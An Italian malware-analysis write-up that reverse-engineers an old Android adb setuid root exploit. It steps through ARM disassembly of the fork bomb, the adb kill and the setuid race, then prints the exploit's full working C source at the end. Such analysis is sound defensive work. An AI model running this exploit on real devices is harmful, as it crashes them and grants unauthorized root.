@@ -1,0 +1,548 @@
+Fork Flood ~ HCF
+
+Reverse Engineering di un exploit Android con saturazione della Process Table tramite Fork-Bomb
+
+;Varroa destructor: è un acaro ectoparassita che si attacca alle vittime e si nutre della loro emolinfa, indebolendole progressivamente senza ucciderle subito. Il suo vero impatto non è tanto diretto, quanto sistemico: compromette il sistema immunitario dell'ospite e lo rende vulnerabile ad altri patogeni, come virus deformanti. Le colonie colpite entrano in uno stato di degrado lento ma irreversibile, fino al collasso. Non è quindi un predatore rapido, ma una pressione costante che apre la strada a danni più gravi.
+
+;VirusShare_efb10d9d306199a49377cd21132f67ff
+;ELF 32-bit LSB executable, 
+;ARM, 
+;EABI5 version 1 (SYSV), 
+;dynamically linked, 
+;interpreter /system/bin/linker, 
+;stripped
+
+;l'analisi di questo campione malware è stata condotta attraverso un processo di reverse engineering sul codice assembly, con l'obiettivo di ricostruire il comportamento reale del binario senza alcun accesso al codice sorgente originale. Il lavoro non è basato su ipotesi astratte, ma sull'osservazione diretta delle istruzioni macchina, delle chiamate di sistema e delle interazioni con il sistema operativo.
+
+;il comportamento emerge dalla lettura del flusso assembly: gestione dei processi, accesso al filesystem virtuale di Android tramite /proc, utilizzo delle syscall e manipolazione delle risorse del sistema.
+
+;il risultato è la ricostruzione di un malware che non si limita a sfruttare una singola vulnerabilità classica, ma agisce controllando e alterando progressivamente le condizioni operative del sistema fino a renderlo instabile e vulnerabile a una race condition durante la gestione di adb.
+
+;il comportamento del malware emerge in modo progressivo e coerente lungo tutta la sua esecuzione. La prima fase è caratterizzata da una ricognizione attiva del sistema. Il codice esplora l'elenco dei processi leggendo iterativamente le directory sotto /proc, cercando di individuare un processo specifico, in particolare quello associato ad adb. 
+
+;in particolare analizza dinamicamente i cmdline dei processi attivi:
+
+0x00008698  add r3, pc, r3   
+0x0000869c  mov r1, r3       
+0x000086a0  ldr r2, [var_10h]
+0x000086a4  bl sym.imp.sprintf
+
+;r0, char *s
+;r1, format: "/proc/%d/cmdline"
+;r2, PID corrente (var_10h contatore)
+
+;sono i tre parametri passati alla sprintf
+;int sprintf(char *s, const char *format, var_10h)
+
+;questa struttura mostra chiaramente l'intento: enumerare lo spazio dei processi tramite /proc/%d/cmdline, costruendo dinamicamente i percorsi per ogni PID. Il malware apre ogni entry di /proc, legge il contenuto di cmdline e verifica la presenza di un target specifico, in questo caso il processo adb.
+
+;la lettura dei processi avviene in modo diretto attraverso syscall:
+
+0x000086ac  mov r0, r3       
+0x000086b0  mov r1, 0        
+0x000086b4  bl sym.imp.open
+
+;r0, path  "/proc/%d/cmdline"
+;r1, O_RDONLY
+
+;apertura file, open(path, O_RDONLY)
+
+0x000086e4  ldr r0, [fildes]
+0x000086e8  mov r1, r3       
+0x000086ec  mov r2, 0xff     
+0x000086f0  bl sym.imp.read
+0x000086f4  ldr r0, [fildes]
+0x000086f8  bl sym.imp.close
+
+;r0, fildes
+;r1, buf
+;r2, nbyte = 0xff, 255
+;read(int fildes, void *buf, size_t nbyte)
+
+0x00008708  add r3, pc, r3   
+0x0000870c  mov r1, r3       
+0x00008710  bl sym.imp.strstr
+0x00008718  cmp r3, 0
+0x0000871c  beq 0x8730      
+
+;r1, "/sbin/adb"
+;r0, const char *s1
+;strstr(s1,"/sbin/adb")
+;non trovato, incrementa e continua
+
+;una volta individuata la presenza del processo adb, il comportamento si sposta verso la manipolazione delle risorse. Il codice verifica i limiti imposti dal sistema operativo, in particolare il numero massimo di processi consentiti per utente. Questo controllo è fondamentale perché l'intero attacco si basa sulla capacità di saturare tali limiti. Se il sistema non impone vincoli, il malware si interrompe, segno che la sua strategia dipende fortemente da condizioni ambientali precise.Prima di eseguire l'attacco vero e proprio, il malware verifica i limiti imposti dal kernel:
+
+0x0000884c      mov r0, 6
+0x00008850      mov r1, r3
+0x00008854      bl sym.imp.getrlimit
+
+;r0, 6, RLIMIT_NPROC        
+;confronta con RLIM_INFINITY
+;getrlimit(int resource, struct rlimit *rlim);
+
+0x00008858      mov r3, r0
+0x0000885c      cmp r3, 0
+0x00008860      bge 0x8874
+0x00008864      ldr r3, [0x00008a78]        
+0x00008868      add r3, pc, r3
+0x0000886c      mov r0, r3
+0x00008870      bl fcn.00008630
+0x00008874      ldr r3, [fp, -0x28]         
+0x00008878      cmn r3, 1 
+0x0000887c      bne 0x8898  
+
+;RLIM_INFINITY = 0xFFFFFFFF
+;Compare Negative = esegue r3 + 1 e aggiorna i flag.
+;se r3 = 0xFFFFFFFF (cioè -1, tutti bit a 1), allora:
+;0xFFFFFFFF + 1 = 0 e si attiva lo zero flag
+
+0x00008880      ldr r3, [0x00008a7c]        
+0x00008884      add r3, pc, r3
+0x00008888      mov r0, r3
+0x0000888c      bl sym.imp.puts             
+0x00008890      mov r0, 1
+0x00008894      bl sym.imp.exit     
+
+;se cmn r3, 1 è uguale a 0 avremo RLIM_INFINITY
+;se il limite è finito prosegue, altrimenti esce
+
+;questo controllo è essenziale: se non esistono limiti di processo (caso RLIM_INFINITY), l'attacco viene interrotto. Questo dimostra che il malware non agisce in maniera stupida, ma dipende fortemente dalle condizioni ambientali.
+
+;se il limite non esiste (caso RLIM_INFINITY), il malware termina l'esecuzione. Questo dettaglio conferma che l'intero exploit è progettato per funzionare solo in un ambiente con limiti reali sfruttabili.
+
+;successivamente avviene la trasformazione del processo in un'entità indipendente dal terminale. Il malware si sgancia dalla sessione corrente e diventa un processo daemonizzato, perdendo ogni legame con il controllo diretto dell'utente. Questo passaggio è tipico dei malware che vogliono mantenere persistenza e autonomia operativa.
+
+;fork iniziale + daemonizzazione
+
+0x00008934  bl  fork          
+0x00008940  ble LAB_0000894c
+0x00008944  mov r0, #0x0
+0x00008948  bl  exit          
+
+;se fork()<=0 ci troviamo nel processo figlio quindi qui salta a LAB_0000894c
+;fork()>0 padre esce e termina
+
+LAB_0000894c:
+0x0000894c  bl  setsid        
+0x00008958  bl  pipe          
+
+;setsid crea una nuova sessione e rende il processo leader della sessione.
+;non ha controlling terminal, vive indipendentemente dalla shell diventa simile a un daemon, continua anche se adb si resetta.
+;figlio si stacca dal terminale.
+;crea pipe(pepe) per sincronizzazione.
+
+;pipe crea due file descriptor:
+
+;pepe[0] = read end
+;pepe[1] = write end
+
+;serve per far parlare:
+
+;processo fork-bomber (figlio che satura il sistema con le fork).
+;processo controller (padre che aspetta).
+
+;il codice si trasforma in un demone: non dipende più dal terminale e può operare in background. Questa è una fase tipica dei malware che vogliono diventare indipendenti dal terminale e operare in modo persistente.
+
+;il cuore dell'attacco consiste nella generazione massiva di processi. Il sistema viene progressivamente saturato attraverso continue chiamate fork, fino a raggiungere il limite imposto dal kernel. In questo stato, il sistema operativo si trova in una condizione di estrema pressione sulle risorse disponibili. Non si tratta di un attacco diretto a adb, ma di una strategia indiretta: si modifica il contesto globale fino a rendere instabile il comportamento dei servizi critici.
+
+;la fase successiva è quella realmente distruttiva: la saturazione del sistema attraverso fork ripetuti. Il cuore dell'attacco è la generazione massiva di processi tramite fork ripetuti, fino al raggiungimento del limite di sistema.
+
+;secondo fork: processo fork-bomber
+;il main genera un secondo figlio che diventa il processo responsabile della saturazione.
+;il padre originale si sgancia e resta in attesa sulla pipe come processo di controllo.
+
+0x0000895c  bl  fork          
+0x00008960  mov r3, r0
+0x00008964  cmp r3, 0
+0x00008968  bne LAB_00008a0c 
+
+;fork()==0, siamo nel figlio fork-bomber (entra nel ramo di saturazione).
+;fork()>0, siamo nel padre, che non partecipa alla fork bomb e va nella logica di monitoraggio/restart.
+
+0x00008974  bl  close 
+0x00008978  b   0x8980
+
+;chiude il lato della pipe non necessario a questo processo.
+;da qui inizia la fase di saturazione vera e propria.
+
+;loop infinito di fork (core della fork bomb).
+;ogni iterazione genera un processo figlio.
+;il figlio termina immediatamente, non esegue cleanup, diventa zombie temporaneo.
+;la process table viene progressivamente saturata.
+;il sistema entra in stress su RLIMIT_NPROC.
+
+LAB_00008980:
+0x00008980  bl  fork                  
+0x00008984  mov r3, r0
+0x00008988  str r3, [fp, -0x10]
+
+;p=fork(), viene salvato il return value della fork nello stack.
+
+;tre casi possibili:
+
+;p==0 figlio appena creato
+;p>0 padre del fork-bomber loop
+;p<0 fork fallita (risorse esaurite)
+
+0x00008990  cmp r3, 0
+0x00008994  bne LAB_000089a0
+0x00008998  mov r0, 0
+0x0000899c  bl  sym.imp.exit
+
+;caso p==0 (figlio):
+;il processo non continua l'esecuzione.
+;termina immediatamente, non sincronizza, non libera risorse.
+;contribuisce indirettamente alla pressione sul sistema (zombie/slot transienti).
+
+LAB_000089a0:
+
+;ramo non-figlio (p!=0)
+;qui si separano i due casi reali:
+;p>0 processo fork-bomber (continua a forkare).
+;p<0 fork fallita (process table piena/limite raggiunto).
+
+0x000089a4  cmp r3, 0
+0x000089a8  bge 0x89fc
+
+;se p>=0 (padre fork-bomber), continua la generazione di processi.
+;se p<0, entra nella gestione di saturazione.
+
+0x000089ac  ldr r3, [fp, -8]
+0x000089b0  cmp r3, 0
+0x000089b4  beq 0x897c
+
+;controllo stato interno (new_pids).
+;evita di ripetere più volte la segnalazione al processo padre.
+;funzione di throttling del signalling su pipe.
+
+0x000089b8  ldr r3, [0x00008a9c]
+0x000089bc  add r3, pc, r3
+0x000089c0  mov r0, r3
+0x000089c4  ldr r1, [fp, -0xc]
+0x000089c8  bl sym.imp.printf
+0x000089cc  mov r3, 0
+0x000089d0  str r3, [fp, -8]
+0x000089d4  ldr r2, [fp, -0x18]
+0x000089d8  sub r3, fp, 0x1d
+0x000089dc  mov r0, r2
+0x000089e0  mov r1, r3
+0x000089e4  mov r2, 1
+0x000089e8  bl sym.imp.write
+0x000089ec  ldr r3, [fp, -0x18]
+0x000089f0  mov r0, r3
+0x000089f4  bl sym.imp.close
+0x000089f8  b   0x8980
+
+;prima occorrenza di fork failure:
+
+;logging diagnostico.
+;write su pipe per sbloccare il processo padre (segnale di saturazione).
+;chiusura lato write della pipe per evitare duplicazioni del trigger.
+;ritorno al loop di saturazione (pressione continua sul sistema).
+
+LAB_000089fc:
+
+;caso p>0 (padre del fork-bomber loop).
+;continua la generazione dei processi.
+
+0x00008a00  ldr r3, [fp, -0xc]
+0x00008a04  add r3, r3, #1
+0x00008a08  str r3, [fp, -0xc]
+0x00008a0c  b   0x8980
+
+;incremento contatore processi generati.
+;loop infinito di fork, pressione continua sulla process table.
+;obiettivo: saturazione progressiva fino a raggiungere RLIMIT_NPROC e innescare la fase successiva dell'exploit.
+
+;qui il comportamento è chiaro: crescita lineare dei processi fino al limite imposto dal kernel. Non è un attacco diretto a un servizio, ma una pressione sistemica sulle risorse.
+
+;il comportamento risultante è una crescita incontrollata del numero di processi, che porta il kernel a saturare la process table e a entrare in uno stato degradato.
+
+;a questo punto, il processo adb viene terminato. Il sistema tenta di riavviare il servizio, ma lo fa in una condizione alterata, con risorse quasi completamente esaurite e una finestra temporale estremamente fragile. È in questo intervallo che si manifesta la race condition.
+
+;il sistema entra progressivamente in uno stato instabile, dove la scheduling dei processi diventa non deterministica.
+
+;quando il sistema è sufficientemente saturato, il malware interviene direttamente sul processo target:
+
+;blocco del processo padre.
+;attende sulla pipe il segnale dal fork-bomber.
+
+LAB_00008a0c:                         
+0x00008a2c  bl  read
+
+;abbiamo due processi:
+
+;fork-bomber, crea pressione (fork loop).
+;controller (padre), decide quando scatenare la fase successiva.
+
+;pipe sbloccata: i slot sono esauriti, procedi.
+;si blocca finché il fork-bomber non scrive un byte, il fork-bomber esegue write(pepe[1], &c, 1);
+;cioè quando la fork bomb entra nello stato di saturazione, parte la fase successiva.
+
+0x00008a34  bl  FUN_00008768     
+
+;kill(adb_pid, 9).
+;uccide adb.
+;il sistema lo riavvierà automaticamente in condizioni degradate.
+
+;doppio fork: crea un processo orfano che mantiene slot occupati.
+;anche dopo che il fork-bomber esaurisce i tentativi.
+
+0x00008a38  bl  fork
+0x00008a48  bl  fork
+LAB_00008a4c:
+0x00008a50  bl  sleep(0x743C)
+0x00008a54  b   LAB_00008a4c
+
+;doppio fork: crea un processo orfano persistente.
+;questo processo non esegue logica utile.
+;ma rimane attivo occupando uno slot nella process table.
+
+;il sleep infinito lo rende CPU-neutral ma resource-resident.
+;serve a impedire il recupero del sistema dopo la fase di saturazione.
+;anche quando il fork-bomber termina la sua attività.
+
+;questo crea un processo "orfano" che dorme indefinitamente mantenendo occupati gli slot anche dopo che il fork-bomber ha finito.
+
+;il processo adb viene terminato forzatamente. Questo non è ancora l'exploit finale, ma il trigger che forza il sistema a ricrearlo in condizioni degradate.
+
+;una volta ucciso adb, il malware non si limita ad attendere passivamente. Entra in una fase di verifica attiva: monitora continuamente lo spazio dei processi cercando un nuovo processo adb con PID diverso da quello originale. Quando lo individua, attende 5 secondi, una finestra calcolata per dare tempo al sistema di tentare l'inizializzazione, e poi invia un SIGKILL broadcast a tutti i processi del sistema.
+
+;loop di attesa: cerca adb con PID diverso dall'originale:
+
+0x000087a4  bl  find_adb()      
+0x000087b4  cmp r3, #0x0
+0x000087b8  beq 0x87e8             
+0x000087c4  cmp r2, r3            
+0x000087c8  beq 0x87e8           
+
+;find_adb() scansiona /proc.
+;non trovato sleep(1) e riprova.
+;cmp r2, r3, trovato == vecchio PID? 
+;se sì sleep(1) e riprova. Altrimenti passa alla kill massiva.
+
+;nuovo adb trovato, attendi e uccidi tutto:
+
+0x000087cc  mov r0, #5
+0x000087d0  bl  sleep              
+0x000087d4  mvn r0, #0            
+0x000087d8  mov r1, #9            
+0x000087dc  bl  kill            
+
+;mvn r0, 0      
+;mov r1, 9      
+
+;r0 = ~0 = 0xFFFFFFFF = -1
+;SIGKILL
+
+;sleep(5)
+;pid = -1 (tutti i processi)
+;SIGKILL
+;kill(-1, 9)
+
+;il kill(-1, 9) è il momento terminale dell'exploit: un segnale broadcast che colpisce tutti i processi dell'utente corrente. Se setuid() non è riuscito nel nuovo adb a causa della saturazione, il processo è rimasto con privilegi elevati, e in quello stato viene lasciato operare dopo che il broadcast ha eliminato tutto il resto.
+
+;le risorse sono ormai vicine al limite e il comportamento del sistema non è più deterministico. È in questa fase che si crea la finestra di race condition.
+
+;la chiamata a setuid() avviene internamente al processo adb al riavvio, fuori dal codice di questo binario
+
+;in condizioni normali, questa chiamata riduce i privilegi del processo. Tuttavia, in uno stato di saturazione e race condition, la sequenza di inizializzazione può non comportarsi in modo affidabile, creando la finestra per l'exploit.
+
+;il nuovo processo adb, durante la sua inizializzazione, dovrebbe eseguire operazioni di deprivilegiamento tramite setuid. Tuttavia, a causa dello stato del sistema, questa transizione non avviene correttamente. Il risultato è che il processo può rimanere in uno stato privilegiato, generando l'effetto desiderato dall'exploit.
+
+;l'intero meccanismo non si basa quindi su una singola vulnerabilità isolata, ma su una concatenazione di processi: saturazione delle risorse, temporizzazione, riavvio del servizio e comportamento non deterministico del sistema operativo sotto stress.
+
+;conclusione
+
+;questo malware non segue il modello classico degli exploit basati su corruzione della memoria o esecuzione diretta di codice arbitrario.
+non colpisce una singola vulnerabilità isolata, ma interviene sul sistema nel suo complesso, alterandone progressivamente lo stato operativo fino a rendere emergenti comportamenti instabili e non deterministici.
+
+;non forza direttamente il sistema, ma opera all'interno di condizioni già compromesse o in fase di degrado. osserva lo stato del sistema, ne intercetta le incoerenze e ne sfrutta le finestre temporali instabili, amplificando gli effetti della saturazione fino a trasformarli in opportunità di exploit. La sua efficacia non risiede nella creazione del caos, ma nell'abilità di muoversi dentro il caos già presente e sfruttarlo nel momento in cui diventa funzionale all'attacco.
+
+;TTP: Tactics, Techniques and Procedures, è il framework MITRE ATT&CK. Descrive il comportamento di un attaccante in modo strutturato e universale, indipendentemente dal codice specifico. Ogni TTP ha un ID numerico che permette a ricercatori e difensori di parlare lo stesso linguaggio. Si divide in tre livelli: la tattica è l'obiettivo generale (es. escalation di privilegi), la tecnica è il metodo usato (es. abuso di setuid), la procedura è l'implementazione specifica osservata nel campione. Serve principalmente a chi difende i sistemi per capire cosa cercare e come mitigare.
+
+;T1057: Process Discovery, la scansione iterativa di /proc/%d/cmdline per trovare adb
+;T1078.003: Valid Accounts: Local Accounts, sfrutta il contesto shell dell'utente adb
+;T1548.001: Abuse Elevation Control Mechanism: Setuid and Setgid, il cuore dell'exploit, la race condition su setuid()
+;T1499.001: Endpoint Denial of Service, OS Exhaustion Flood: la fork-bomb che satura la process table
+;T1543: Create or Modify System Process, il riavvio di adb in stato alterato
+
+;CARO: Computer Antivirus Research Organization
+;È uno schema di nomenclatura standardizzato per i malware, nato negli anni '90 per evitare che vendor diversi chiamassero lo stesso malware in modi incompatibili. Il formato Tipo:Piattaforma/Famiglia.Variante permette di identificare univocamente un campione. Serve ai ricercatori per catalogare, confrontare e comunicare in modo non ambiguo quando si parla di un campione specifico, indipendentemente dal vendor che lo ha analizzato.
+
+;Il formato CARO è: Tipo:Piattaforma/Famiglia.Variante!Suffisso
+;Per questo campione:
+
+Exploit:Android/AdbSetuid.A!generic
+
+;Exploit: tipo, perché non è un virus/worm ma un exploit locale
+;Android: piattaforma
+;AdbSetuid: famiglia, identifica il vettore
+;.A: prima variante nota
+;!generic: rilevamento generico senza analisi specifica
+
+;Tipo: categoria del malware: Virus, Worm, Trojan, Exploit, Backdoor, Ransomware, Spyware, Adware, Rootkit, Tool
+;Piattaforma: sistema operativo o ambiente: Android, Win32, Linux, MacOS, JS, Python ecc.
+;Famiglia: nome della famiglia malware: AdbSetuid, Exploid ecc.
+;Variante: lettera o numero che distingue versioni della stessa famiglia: .A, .B, .C ecc.
+;Suffisso: campo opzionale che aggiunge informazioni comportamentali, tra i più usati:
+
+!rootkit: ha componenti rootkit
+!packed: è compresso o offuscato
+!dropped: è un payload droppato da un altro malware
+!generic: rilevamento generico senza analisi specifica
+!suspicious: comportamento sospetto ma non classificato
+
+;codice sorgente dell'exploit trovato in rete dopo il reversing:
+
+/* android 1.x/2.x adb setuid() root exploit
+ * (C) 2010 The Android Exploid Crew
+ *
+ * Needs to be executed via adb -d shell. It may take a while until
+ * all process slots are filled and the adb connection is reset.
+ *
+ * !!!This is PoC code for educational purposes only!!!
+ * If you run it, it might crash your device and make it unusable!
+ * So you use it at your own risk!
+ */
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/resource.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <string.h>
+#include <signal.h>
+#include <stdlib.h>
+
+void die(const char *msg)
+{
+	perror(msg);
+	exit(errno);
+}
+
+pid_t find_adb()
+{
+	char buf[256];
+	int i = 0, fd = 0;
+	pid_t found = 0;
+
+	for (i = 0; i < 32000; ++i) {
+		sprintf(buf, "/proc/%d/cmdline", i);
+		if ((fd = open(buf, O_RDONLY)) < 0)
+			continue;
+		memset(buf, 0, sizeof(buf));
+		read(fd, buf, sizeof(buf) - 1);
+		close(fd);
+		if (strstr(buf, "/sbin/adb")) {
+			found = i;
+			break;
+		}
+        }
+        return found;
+}
+
+void restart_adb(pid_t pid)
+{
+	kill(pid, 9);
+}
+
+void wait_for_root_adb(pid_t old_adb)
+{
+	pid_t p = 0;
+
+	for (;;) {
+		p = find_adb();
+		if (p != 0 && p != old_adb)
+			break;
+		sleep(1);
+	}
+	sleep(5);
+	kill(-1, 9);
+}
+
+int main(int argc, char **argv)
+{
+	pid_t adb_pid = 0, p;
+	int pids = 0, new_pids = 1;
+	int pepe[2];
+	char c = 0;
+	struct rlimit rl;
+
+	printf("[*] CVE-2010-EASY Android local root exploit (C) 2010 by 743C\n\n");
+	printf("[*] checking NPROC limit ...\n");
+
+	if (getrlimit(RLIMIT_NPROC, &rl) < 0)
+		die("[-] getrlimit");
+
+	if (rl.rlim_cur == RLIM_INFINITY) {
+		printf("[-] No RLIMIT_NPROC set. Exploit would just crash machine. Exiting.\n");
+		exit(1);
+	}
+
+	printf("[+] RLIMIT_NPROC={%lu, %lu}\n", rl.rlim_cur, rl.rlim_max);
+	printf("[*] Searching for adb ...\n");
+
+	adb_pid = find_adb();
+
+	if (!adb_pid)
+		die("[-] Cannot find adb");
+
+	printf("[+] Found adb as PID %d\n", adb_pid);
+	printf("[*] Spawning children. Dont type anything and wait for reset!\n");
+	printf("[*]\n[*] If you like what we are doing you can send us PayPal money to\n"
+	       "[*] 7-4-3-C@web.de so we can compensate time, effort and HW costs.\n"
+	       "[*] If you are a company and feel like you profit from our work,\n"
+	       "[*] we also accept donations > 1000 USD!\n");
+	printf("[*]\n[*] adb connection will be reset. restart adb server on desktop and re-login.\n");
+
+	sleep(5);
+
+	if (fork() > 0)
+		exit(0);
+
+	setsid();
+	pipe(pepe);
+
+	/* generate many (zombie) shell-user processes so restarting
+	 * adb's setuid() will fail.
+	 * The whole thing is a bit racy, since when we kill adb
+	 * there is one more process slot left which we need to
+	 * fill before adb reaches setuid(). Thats why we fork-bomb
+	 * in a seprate process.
+	 */
+	if (fork() == 0) {
+		close(pepe[0]);
+		for (;;) {
+			if ((p = fork()) == 0) {
+				exit(0);
+			} else if (p < 0) {
+				if (new_pids) {
+					printf("\n[+] Forked %d childs.\n", pids);
+					new_pids = 0;
+					write(pepe[1], &c, 1);
+					close(pepe[1]);
+				}
+			} else {
+				++pids;
+			}
+		}
+	}
+
+	close(pepe[1]);
+	read(pepe[0], &c, 1);
+
+
+	restart_adb(adb_pid);
+
+	if (fork() == 0) {
+		fork();
+		for (;;)
+			sleep(0x743C);
+	}
+
+	wait_for_root_adb(adb_pid);
+	return 0;
+}
